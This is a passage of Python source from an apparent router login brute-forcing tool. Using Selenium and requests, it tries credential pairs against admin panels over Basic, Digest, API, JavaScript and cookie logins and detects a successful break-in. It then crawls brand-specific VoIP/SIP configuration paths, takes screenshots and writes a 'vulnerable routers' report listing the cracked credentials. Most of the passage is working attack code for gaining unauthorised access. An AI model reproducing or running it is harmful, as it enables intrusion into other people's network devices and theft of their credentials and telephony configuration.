                            screenshots_taken.append(screenshot_path)
                        
                        # Look for VoIP-related forms or tables
                        try:
                            voip_elements = [
                                "input[name*='voip']", "input[name*='sip']", "input[name*='phone']", "input[name*='voice']",
                                "select[name*='voip']", "select[name*='sip']", "select[name*='phone']", "select[name*='voice']",
                                "textarea[name*='voip']", "textarea[name*='sip']", "textarea[name*='phone']", "textarea[name*='voice']",
                                "table[id*='voip']", "table[class*='voip']", "table[id*='sip']", "table[class*='sip']",
                                "form[id*='voip']", "form[name*='voip']", "form[class*='voip']",
                                "form[id*='sip']", "form[name*='sip']", "form[class*='sip']",
                                "div[id*='voip']", "div[class*='voip']", "div[id*='sip']", "div[class*='sip']"
                            ]
                            
                            for selector in voip_elements:
                                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                                if elements:
                                    print(f"{Colors.GREEN}[+] Found VoIP/SIP element: {selector} ({len(elements)} elements){Colors.END}")
                                    break
                                    
                        except Exception as e:
                            pass
                    
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error searching admin panel content: {e}{Colors.END}")
            
            if screenshots_taken:
                print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
                return screenshots_taken
            else:
                print(f"{Colors.YELLOW}[!] No VoIP/SIP configuration pages found{Colors.END}")
                return []
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error finding VoIP/SIP pages: {e}{Colors.END}")
            return []
    
    def identify_router_brand(self):
        """Identify router brand and model from page content"""
        try:
            print(f"{Colors.CYAN}[*] Identifying router brand and model...{Colors.END}")
            
            # Get page content
            page_source = self.driver.page_source.lower()
            title = self.driver.title.lower()
            current_url = self.driver.current_url.lower()
            
            # Router brand patterns
            brands = {
                'tp-link': ['tp-link', 'tplink', 'tplink', 'tp link'],
                'cisco': ['cisco', 'linksys'],
                'netgear': ['netgear'],
                'd-link': ['d-link', 'dlink', 'd link'],
                'asus': ['asus'],
                'belkin': ['belkin'],
                'zyxel': ['zyxel'],
                'huawei': ['huawei'],
                'zte': ['zte'],
                'mikrotik': ['mikrotik', 'routeros'],
                'ubiquiti': ['ubiquiti', 'unifi'],
                'arris': ['arris'],
                'motorola': ['motorola'],
                'actiontec': ['actiontec'],
                'netcomm': ['netcomm'],
                'broadcom': ['broadcom'],
                'realtek': ['realtek']
            }
            
            detected_brands = []
            
            # Check title and content for brand indicators
            for brand, patterns in brands.items():
                for pattern in patterns:
                    if pattern in page_source or pattern in title or pattern in current_url:
                        detected_brands.append(brand)
                        print(f"{Colors.GREEN}[+] Detected router brand: {brand.upper()} (pattern: {pattern}){Colors.END}")
                        break
            
            # Check for model indicators
            model_indicators = [
                'router', 'gateway', 'access point', 'ap', 'wifi', 'wireless',
                'adsl', 'dsl', 'cable', 'fiber', 'broadband'
            ]
            
            detected_models = []
            for indicator in model_indicators:
                if indicator in title or indicator in page_source:
                    detected_models.append(indicator)
            
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            print(f"{Colors.BLUE}[*] Detected brands: {detected_brands}{Colors.END}")
            print(f"{Colors.BLUE}[*] Model indicators: {detected_models}{Colors.END}")
            
            return detected_brands, detected_models
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error identifying router brand: {e}{Colors.END}")
            return [], []
    
    def get_brand_specific_voip_paths(self, brands):
        """Get VoIP/SIP paths specific to detected router brands"""
        try:
            print(f"{Colors.CYAN}[*] Getting brand-specific VoIP/SIP paths...{Colors.END}")
            
            # Brand-specific VoIP/SIP paths
            brand_paths = {
                'tp-link': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone',
                    '/advanced/voip.html', '/advanced/sip.html', '/advanced/voice.html',
                    '/network/voip.html', '/network/sip.html',
                    '/admin/voip.html', '/admin/sip.html',
                    '/voip_config.html', '/sip_config.html',
                    '/voip_status.html', '/sip_status.html',
                    '/voice_config.html', '/telephony_config.html'
                ],
                'cisco': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone',
                    '/advanced/voip.html', '/advanced/sip.html',
                    '/network/voip.html', '/network/sip.html',
                    '/admin/voip.html', '/admin/sip.html',
                    '/voip_config.html', '/sip_config.html',
                    '/voice_config.html', '/telephony_config.html',
                    '/call_manager.html', '/unified_communications.html'
                ],
                'netgear': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone',
                    '/advanced/voip.html', '/advanced/sip.html',
                    '/network/voip.html', '/network/sip.html',
                    '/admin/voip.html', '/admin/sip.html',
                    '/voip_config.html', '/sip_config.html',
                    '/voice_config.html', '/telephony_config.html'
                ],
                'd-link': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone',
                    '/advanced/voip.html', '/advanced/sip.html',
                    '/network/voip.html', '/network/sip.html',
                    '/admin/voip.html', '/admin/sip.html',
                    '/voip_config.html', '/sip_config.html',
                    '/voice_config.html', '/telephony_config.html'
                ],
                'asus': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone',
                    '/advanced/voip.html', '/advanced/sip.html',
                    '/network/voip.html', '/network/sip.html',
                    '/admin/voip.html', '/admin/sip.html',
                    '/voip_config.html', '/sip_config.html',
                    '/voice_config.html', '/telephony_config.html'
                ],
                'generic': [
                    '/voip', '/sip', '/voice', '/telephony', '/phone', '/fax',
                    '/advanced/voip', '/advanced/sip', '/advanced/voice', '/advanced/telephony',
                    '/network/voip', '/network/sip', '/network/voice', '/network/telephony',
                    '/admin/voip', '/admin/sip', '/admin/voice', '/admin/telephony',
                    '/config/voip', '/config/sip', '/config/voice', '/config/telephony',
                    '/settings/voip', '/settings/sip', '/settings/voice', '/settings/telephony',
                    '/system/voip', '/system/sip', '/system/voice', '/system/telephony',
                    '/voip.html', '/sip.html', '/voice.html', '/telephony.html', '/phone.html',
                    '/advanced_voip.html', '/advanced_sip.html', '/voip_config.html', '/sip_config.html',
                    '/voip_configuration.html', '/sip_configuration.html', '/voice_config.html',
                    '/phone_config.html', '/telephony_config.html', '/pbx.html', '/trunk.html',
                    '/call_routing.html', '/extension.html', '/gateway.html', '/proxy.html',
                    '/call_forwarding.html', '/voicemail.html', '/conference.html', '/hold.html',
                    '/dial_plan.html', '/codec.html', '/dtmf.html', '/ringtone.html',
                    '/call_transfer.html', '/call_waiting.html', '/caller_id.html'
                ]
            }
            
            all_paths = []
            
            # Add brand-specific paths
            for brand in brands:
                if brand in brand_paths:
                    all_paths.extend(brand_paths[brand])
                    print(f"{Colors.GREEN}[+] Added {len(brand_paths[brand])} paths for {brand.upper()}{Colors.END}")
            
            # Always add generic paths
            all_paths.extend(brand_paths['generic'])
            
            # Remove duplicates while preserving order
            unique_paths = []
            seen = set()
            for path in all_paths:
                if path not in seen:
                    unique_paths.append(path)
                    seen.add(path)
            
            print(f"{Colors.BLUE}[*] Total unique VoIP/SIP paths: {len(unique_paths)}{Colors.END}")
            return unique_paths
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error getting brand-specific paths: {e}{Colors.END}")
            return []
    
    def search_voip_after_success(self, login_url, username, password):
        """Search for VoIP/SIP pages after successful login"""
        try:
            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages after successful login...{Colors.END}")
            
            # Extract base URL for VoIP search
            from urllib.parse import urlparse
            parsed_url = urlparse(login_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Step 1: Identify router brand and model
            brands, models = self.identify_router_brand()
            
            # Step 2: Get brand-specific VoIP/SIP paths
            voip_paths = self.get_brand_specific_voip_paths(brands)
            
            print(f"{Colors.BLUE}[*] Starting intelligent VoIP/SIP search...{Colors.END}")
            
            screenshots_taken = []
            
            # Method 1: Try brand-specific and generic VoIP/SIP paths
            print(f"{Colors.BLUE}[*] Method 1: Testing brand-specific VoIP/SIP paths...{Colors.END}")
            
            if not voip_paths:
                # Fallback to generic paths if brand detection failed
                voip_paths = [
                    "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
                    "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
                    "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
                    "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
                    "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
                    "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
                    "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
                    "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
                    "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
                    "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
                    "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
                    "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
                    "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
                    "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
                    "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
                ]
            
            for i, path in enumerate(voip_paths):
                try:
                    voip_url = f"{base_url.rstrip('/')}{path}"
                    print(f"{Colors.BLUE}[*] Testing VoIP path {i+1}/{len(voip_paths)}: {voip_url}{Colors.END}")
                    
                    self.driver.get(voip_url)
                    time.sleep(2)  # Shorter wait for faster testing
                    
                    # Check if page loaded successfully and contains VoIP/SIP content
                    page_source = self.driver.page_source.lower()
                    title = self.driver.title.lower()
                    
                    # Enhanced VoIP/SIP indicators
                    voip_indicators = [
                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
                        'sip server', 'voip server', 'phone system', 'call routing',
                        'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
                        'call forwarding', 'call transfer', 'conference', 'hold',
                        'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf',
                        'call waiting', 'caller id', 'call blocking', 'call log'
                    ]
                    
                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
                    title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
                    total_voip_indicators = voip_count + title_voip_count
                    
                    # More lenient criteria - even 1 indicator might be worth checking
                    if total_voip_indicators >= 1:
                        print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
                        print(f"{Colors.GREEN}[+] VoIP indicators: {total_voip_indicators} (content: {voip_count}, title: {title_voip_count}){Colors.END}")
                        print(f"{Colors.GREEN}[+] Page title: {self.driver.title}{Colors.END}")
                        
                        # Take screenshot
                        screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_').replace('.html', '')}", voip_url)
                        if screenshot_path:
                            screenshots_taken.append(screenshot_path)
                        
                        # Don't break - continue to find more pages
                        continue
                    
                    # Check for HTTP status codes that might indicate VoIP pages
                    if "404" not in page_source and "not found" not in page_source:
                        # Even if no VoIP indicators, check if it's a configuration page
                        config_indicators = ['configuration', 'settings', 'setup', 'config', 'admin']
                        config_count = sum(1 for indicator in config_indicators if indicator in page_source or indicator in title)
                        
                        if config_count >= 2 and total_voip_indicators >= 0:
                            print(f"{Colors.YELLOW}[*] Potential configuration page: {voip_url}{Colors.END}")
                            print(f"{Colors.YELLOW}[*] Config indicators: {config_count}{Colors.END}")
                            
                            # Take screenshot for manual review
                            screenshot_path = self.take_screenshot(f"potential_config_{path.replace('/', '_').replace('.html', '')}", voip_url)
                            if screenshot_path:
                                screenshots_taken.append(screenshot_path)
                        
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error testing path {voip_url}: {e}{Colors.END}")
                    continue
            
            # Method 2: Try to navigate back to admin panel and search for links
            if not screenshots_taken:
                print(f"{Colors.BLUE}[*] Method 2: Searching admin panel for VoIP/SIP links...{Colors.END}")
                
                try:
                    # Go back to admin panel
                    self.driver.get(base_url)
                    time.sleep(3)
                    
                    # Try the enhanced link search
                    voip_screenshots = self.find_voip_sip_pages(base_url)
                    screenshots_taken.extend(voip_screenshots)
                    
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Error in Method 2: {e}{Colors.END}")
            
            if screenshots_taken:
                print(f"{Colors.GREEN}[+] VoIP/SIP screenshots taken: {len(screenshots_taken)}{Colors.END}")
                return screenshots_taken
            else:
                print(f"{Colors.YELLOW}[!] No VoIP/SIP configuration pages found{Colors.END}")
                return []
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error searching for VoIP pages: {e}{Colors.END}")
            return []
    
    def quit(self):
        """Quit the browser driver"""
        if hasattr(self, 'driver') and self.driver:
            try:
                self.driver.quit()
            except:
                pass
    
    def add_vulnerable_finding(self, url, username, password, auth_type, screenshot_path, device_info=None):
        """Add a vulnerable finding to the list"""
        finding = {
            'url': url,
            'username': username,
            'password': password,
            'auth_type': auth_type,
            'screenshot_path': screenshot_path,
            'device_info': device_info,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.vulnerable_findings.append(finding)
    
    def generate_report(self):
        """Generate a text report of vulnerable findings"""
        if not self.vulnerable_findings:
            return None
        
        report_filename = f"vulnerable_routers_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        report_path = os.path.join(self.screenshot_dir, report_filename)
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("ROUTER BRUTE FORCE - VULNERABLE FINDINGS REPORT\n")
                f.write("=" * 80 + "\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Vulnerable Routers Found: {len(self.vulnerable_findings)}\n")
                f.write("=" * 80 + "\n\n")
                
                for i, finding in enumerate(self.vulnerable_findings, 1):
                    f.write(f"[{i}] VULNERABLE ROUTER FOUND:\n")
                    f.write(f"    URL: {finding['url']}\n")
                    f.write(f"    Credentials: {finding['username']}:{finding['password']}\n")
                    f.write(f"    Authentication Type: {finding['auth_type']}\n")
                    f.write(f"    Device Info: {finding.get('device_info', 'N/A')}\n")
                    f.write(f"    Screenshot: {finding['screenshot_path']}\n")
                    f.write(f"    Timestamp: {finding['timestamp']}\n")
                    f.write("-" * 60 + "\n\n")
                
                f.write("=" * 80 + "\n")
                f.write("END OF REPORT\n")
                f.write("=" * 80 + "\n")
            
            print(f"{Colors.GREEN}[+] Report saved: {report_path}{Colors.END}")
            return report_path
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error generating report: {e}{Colors.END}")
            return None
    
    def wait_for_page_load(self, timeout=10):
        """Intelligently wait for page to load completely"""
        try:
            # Wait for page title to be present
            WebDriverWait(self.driver, timeout).until(
                lambda driver: driver.title is not None and driver.title.strip() != ""
            )
            
            # Wait for page to be interactive
            WebDriverWait(self.driver, timeout).until(
                lambda driver: driver.execute_script("return document.readyState") == "complete"
            )
            
            # Additional wait for dynamic content
            time.sleep(2)
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Page load timeout, continuing...{Colors.END}")
            time.sleep(3)  # Fallback wait
    
    def handle_alert(self):
        """Handle browser alerts (login failure messages)"""
        try:
            # Wait for alert to appear
            WebDriverWait(self.driver, 3).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            print(f"{Colors.YELLOW}[!] Alert detected: {alert_text}{Colors.END}")
            alert.accept()  # Click OK to dismiss alert
            time.sleep(1)  # Wait a bit after handling alert
            return alert_text
        except Exception as e:
            # Try to handle unexpected alerts
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                print(f"{Colors.YELLOW}[!] Unexpected alert: {alert_text}{Colors.END}")
                alert.accept()
                time.sleep(1)  # Wait a bit after handling alert
                return alert_text
            except:
                return None
    
    def extract_device_info(self):
        """Extract device information from admin panel"""
        try:
            device_info = {}
            
            # Get page title
            device_info['title'] = self.driver.title
            
            # Try to extract common device information
            page_source = self.driver.page_source.lower()
            
            # Look for manufacturer info
            manufacturer_patterns = ['manufacturer', 'vendor', 'brand', 'model', 'device name', 'product name']
            for pattern in manufacturer_patterns:
                if pattern in page_source:
                    device_info['manufacturer'] = f"Found {pattern}"
                    break
            
            # Look for uptime info
            uptime_patterns = ['uptime', 'system uptime', 'device uptime', 'running time']
            for pattern in uptime_patterns:
                if pattern in page_source:
                    device_info['uptime'] = f"Found {pattern}"
                    break
            
            # Look for firmware version
            firmware_patterns = ['firmware', 'version', 'software version', 'build']
            for pattern in firmware_patterns:
                if pattern in page_source:
                    device_info['firmware'] = f"Found {pattern}"
                    break
            
            # Look for device status
            status_patterns = ['device status', 'system status', 'router status', 'gateway status']
            for pattern in status_patterns:
                if pattern in page_source:
                    device_info['status'] = f"Found {pattern}"
                    break
            
            return device_info
            
        except Exception as e:
            return {'error': str(e)}
    
    def is_admin_panel_loaded(self):
        """Check if we're in admin panel with detailed verification"""
        try:
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title.lower()
            
            print(f"{Colors.BLUE}[*] Checking admin panel - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # Check for error pages
            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
            if any(error in page_source for error in error_indicators):
                return False, "Error page detected"
            
            # Check for admin panel indicators (expanded list)
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
                'device', 'interface', 'port', 'service', 'security', 'advanced',
                'device info', 'system info', 'router info', 'gateway info',
                'home', 'overview', 'summary', 'statistics', 'traffic', 'bandwidth',
                'users', 'clients', 'connected devices', 'wifi', 'ethernet',
                'internet', 'connection', 'ip address', 'subnet', 'dns server',
                'time', 'date', 'timezone', 'language', 'theme', 'appearance'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username',
                'login form', 'password field', 'username field', 'submit', 'log in'
            ]
            
            # Check for specific success indicators
            success_indicators = [
                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
                'device status', 'network status', 'router status', 'admin panel',
                'device info', 'system info', 'router info', 'gateway info',
                'connected', 'online', 'active', 'running', 'operational'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            print(f"{Colors.BLUE}[*] Analysis - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}{Colors.END}")
            
            # More lenient success criteria for HTTP Basic Auth
            # If we have admin indicators and no login indicators, it's likely admin panel
            if admin_count >= 2 and login_count == 0:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # More lenient criteria for form-based auth
            if admin_count >= 3 and login_count <= 2:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # Original strict criteria
            if admin_count > login_count and admin_count >= 3 and success_count >= 1 and url_changed:
                device_info = self.extract_device_info()
                return True, f"Admin panel loaded - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # If we have significant admin content and URL changed
            if admin_count >= 4 and url_changed and login_count <= 1:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected (high admin content) - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            return False, f"Not admin panel - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}"
            
        except Exception as e:
            return False, f"Error checking admin panel: {e}"
    
    def test_http_basic_auth(self, username, password, login_url):
        """Test HTTP Basic Authentication"""
        try:
            if not hasattr(self, 'driver') or not self.driver:
                return False, "Driver not initialized"
                
            parsed_url = urlparse(login_url)
            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
            
            print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
            self.driver.get(auth_url)
            time.sleep(5)  # Wait longer for page to load completely
            
            # Check current URL and page content
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            print(f"{Colors.BLUE}[*] After Basic Auth - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # For HTTP Basic Auth, don't treat 401 as error if it's part of auth flow
            # Check for actual error pages (not auth challenges)
            error_indicators = [
                'not authorized', 'access denied', 'forbidden', 'unauthorized', 
                'you are not authorized', 'please contact your support', 'try again',
                'http 403', 'http 404', 'http 500'
            ]
            
            # Only treat 401 as error if it's not part of HTTP Basic auth flow
            if 'http 401' in page_source:
                if not ('www-authenticate' in page_source or 'basic' in page_source):
                    error_indicators.append('http 401')
            
            if any(error in page_source for error in error_indicators):
                return False, f"Error page detected after HTTP Basic Auth attempt"
            
            # Check if we successfully bypassed auth (not on error page)
            if "data:," not in current_url and current_url != "about:blank":
                # Check if we're in admin panel
                is_admin, reason = self.is_admin_panel_loaded()
                
                if is_admin:
                    print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
                    print(f"{Colors.BLUE}[*] Admin panel details: {reason}{Colors.END}")
                    # Wait a bit more for admin panel to fully load
                    time.sleep(3)
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                    
                    # Search for VoIP/SIP pages after successful login
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    return True, screenshot_path
                else:
                    print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
                    
                    # Force VoIP search even if admin panel detection failed
                    print(f"{Colors.BLUE}[*] Attempting VoIP/SIP search anyway...{Colors.END}")
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    if voip_screenshots:
                        print(f"{Colors.GREEN}[+] Found VoIP/SIP pages despite admin panel detection failure!{Colors.END}")
                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                        return True, screenshot_path
                    else:
                        return False, f"HTTP Basic Auth worked but not admin panel: {reason}"
            else:
                print(f"{Colors.YELLOW}[!] Basic Auth failed - still on error page{Colors.END}")
                return False, "HTTP Basic Auth failed - error page"
            
        except Exception as e:
            return False, f"HTTP Basic Auth error: {e}"
    
    def test_http_digest_auth(self, username, password, login_url):
        """Test HTTP Digest Authentication"""
        try:
            import requests
            from requests.auth import HTTPDigestAuth
            
            print(f"{Colors.BLUE}[*] Testing HTTP Digest Auth: {username}:{password}{Colors.END}")
            
            # Test with requests first
            response = requests.get(login_url, auth=HTTPDigestAuth(username, password), timeout=10)
            
            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] HTTP Digest Auth successful! {username}:{password}{Colors.END}")
                # Navigate to the authenticated URL with Selenium
                self.driver.get(login_url)
                time.sleep(3)
                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                
                # Search for VoIP/SIP pages after successful login
                voip_screenshots = self.search_voip_after_success(login_url, username, password)
                
                return True, screenshot_path
            else:
                print(f"{Colors.YELLOW}[-] HTTP Digest Auth failed: Status {response.status_code}{Colors.END}")
                return False, f"HTTP Digest Auth failed: Status {response.status_code}"
                
        except Exception as e:
            return False, f"HTTP Digest Auth error: {e}"
    
    def test_api_based_auth(self, username, password, login_url):
        """Test API-Based Authentication"""
        try:
            print(f"{Colors.BLUE}[*] Testing API-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(5)
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass
            
            # Try to find API endpoints
            page_source = self.driver.page_source.lower()
            
            # Common API endpoints
            api_endpoints = ['/api/login', '/api/auth', '/login', '/auth', '/api/user/login', '/api/authenticate']
            
            for endpoint in api_endpoints:
                try:
                    # Try JSON payload
                    api_url = f"{login_url.rstrip('/')}{endpoint}"
                    
                    # Test with JSON payload
                    json_payload = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'login': username,
                        'pwd': password
                    }
                    
                    # Execute JavaScript to make API call
                    js_code = f"""
                    fetch('{api_url}', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }},
                        body: JSON.stringify({json_payload})
                    }})
                    .then(response => response.json())
                    .then(data => {{
                        window.apiResult = data;
                        window.apiSuccess = true;
                    }})
                    .catch(error => {{
                        window.apiError = error;
                        window.apiSuccess = false;
                    }});
                    """
                    
                    self.driver.execute_script(js_code)
                    time.sleep(3)
                    
                    # Check result
                    api_success = self.driver.execute_script("return window.apiSuccess;")
                    if api_success:
                        print(f"{Colors.GREEN}[+] API-based Auth successful! {username}:{password}{Colors.END}")
                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                        
                        # Search for VoIP/SIP pages after successful login
                        voip_screenshots = self.search_voip_after_success(login_url, username, password)
                        
                        return True, screenshot_path
                        
                except Exception as e:
                    continue
            
            # Fallback to form-based if API fails
            print(f"{Colors.YELLOW}[!] API auth failed, trying form-based fallback{Colors.END}")
            return self.test_form_based_auth(username, password, login_url)
            
        except Exception as e:
            return False, f"API-based Auth error: {e}"
    
    def test_javascript_based_auth(self, username, password, login_url):
        """Test JavaScript-Based Authentication"""
        try:
            print(f"{Colors.BLUE}[*] Testing JavaScript-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(5)
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass
            
            # Find and fill form fields
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                return False, "Form fields not found"
            
            # Fill credentials
            username_field.clear()
            password_field.clear()
            username_field.send_keys(username)
            password_field.send_keys(password)
            
            # For NetComm routers, try specific JavaScript methods
            try:
                # Try to find and click login button with safer selectors
                login_buttons = []
                
                # Try different button selectors
                button_selectors = [
                    "input[type='submit']",
                    "button[type='submit']", 
                    "input[value*='Login']",
                    "input[value*='Sign']",
                    "button:contains('Login')",
                    "button:contains('Sign')",
                    "input[value='Login']",
                    "input[value='Sign In']",
                    "button",
                    "input[type='button']"
                ]
                
                for selector in button_selectors:
                    try:
                        buttons = self.driver.find_elements("css selector", selector)
                        if buttons:
                            login_buttons.extend(buttons)
                            break
                    except:
                        continue
                
                if login_buttons:
                    # Try to click the first visible button
                    for button in login_buttons:
                        try:
                            if button.is_displayed() and button.is_enabled():
                                button.click()
                                print(f"{Colors.BLUE}[*] Login button clicked{Colors.END}")
                                break
                        except:
                            continue
                    else:
                        # If no button worked, try pressing Enter
                        password_field.send_keys("\n")
                        print(f"{Colors.BLUE}[*] Enter key pressed (no clickable button found){Colors.END}")
                else:
                    # Try pressing Enter
                    password_field.send_keys("\n")
                    print(f"{Colors.BLUE}[*] Enter key pressed (no button found){Colors.END}")
                
                time.sleep(5)
                
                # Handle any alerts
                alert_text = self.handle_alert()
                if alert_text:
                    print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
                    return False, f"Alert: {alert_text}"
                
                # Check if login was successful
                success, reason = self.is_admin_panel_loaded()
                if success:
                    print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                    
                    # Search for VoIP/SIP pages after successful login
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    return True, screenshot_path
                
                # Check if URL changed (might indicate success)
                current_url = self.driver.current_url
                if current_url != login_url and "login" not in current_url.lower():
                    print(f"{Colors.BLUE}[*] URL changed to: {current_url}{Colors.END}")
                    # Try to check if we're in admin panel
                    success, reason = self.is_admin_panel_loaded()
                    if success:
                        print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                        
                        # Search for VoIP/SIP pages after successful login
                        voip_screenshots = self.search_voip_after_success(login_url, username, password)
                        
                        return True, screenshot_path
                
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error in JavaScript auth: {e}{Colors.END}")
            
            return False, "JavaScript-based Auth failed"
            
        except Exception as e:
            return False, f"JavaScript-based Auth error: {e}"
    
    def test_cookie_based_auth(self, username, password, login_url):
        """Test Cookie-Based Authentication"""
        try:
            print(f"{Colors.BLUE}[*] Testing Cookie-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(5)
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass
            
            # Find and fill form fields
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                return False, "Form fields not found"
            
            # Fill credentials
            username_field.clear()
            password_field.clear()
            username_field.send_keys(username)
            password_field.send_keys(password)
            
            # Submit form
            submit_button = self.find_submit_button()
            if submit_button:
                submit_button.click()
            else:
                password_field.send_keys("\n")
            
            time.sleep(5)
            
            # Check for cookies
            cookies = self.driver.get_cookies()
            if cookies:
                print(f"{Colors.BLUE}[*] Cookies found: {len(cookies)} cookies{Colors.END}")
            
            # Check if login was successful
            success, reason = self.is_admin_panel_loaded()
            if success:
